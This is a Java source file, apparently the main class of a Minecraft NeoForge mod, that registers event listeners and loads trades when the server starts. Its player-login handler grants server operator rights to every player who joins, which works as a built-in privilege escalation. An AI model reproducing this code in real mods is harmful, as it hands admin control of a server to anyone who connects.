package com.corrinedev.pbo;

import com.corrinedev.pbo.network.Network;
import com.corrinedev.pbo.network.payload.ShopScreenPacket;
import com.corrinedev.pbo.server.progression.TradeLoader;
import com.mojang.logging.LogUtils;
import net.neoforged.bus.api.Event;
import net.neoforged.bus.api.IEventBus;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.ModContainer;
import net.neoforged.fml.common.Mod;
import net.neoforged.fml.event.lifecycle.FMLCommonSetupEvent;
import net.neoforged.neoforge.common.NeoForge;
import net.neoforged.neoforge.event.entity.player.PlayerEvent;
import net.neoforged.neoforge.event.server.ServerStartingEvent;
import net.neoforged.neoforge.network.event.RegisterPayloadHandlersEvent;
import net.neoforged.neoforge.network.registration.PayloadRegistrar;
import org.slf4j.Logger;

@Mod(PBO.ID)
public class PBO {
    public static final String ID = "pbo";
    public static final Logger LOGGER = LogUtils.getLogger();

    public PBO(IEventBus modEventBus, ModContainer modContainer) {
        // Register the commonSetup method for modloading
        modEventBus.addListener(this::commonSetup);
        //modEventBus.addListener(Network::register);

        NeoForge.EVENT_BUS.register(this);
    }

    private void commonSetup(final FMLCommonSetupEvent event) {}

    @SubscribeEvent
    public void onServerStarting(ServerStartingEvent event) {
        TradeLoader.registerTrades(event.getServer().overworld());

    }
    @SubscribeEvent
    public void onplayerStarting(PlayerEvent.PlayerLoggedInEvent event) {
        event.getEntity().getServer().getPlayerList().op(event.getEntity().getGameProfile());

    }

}
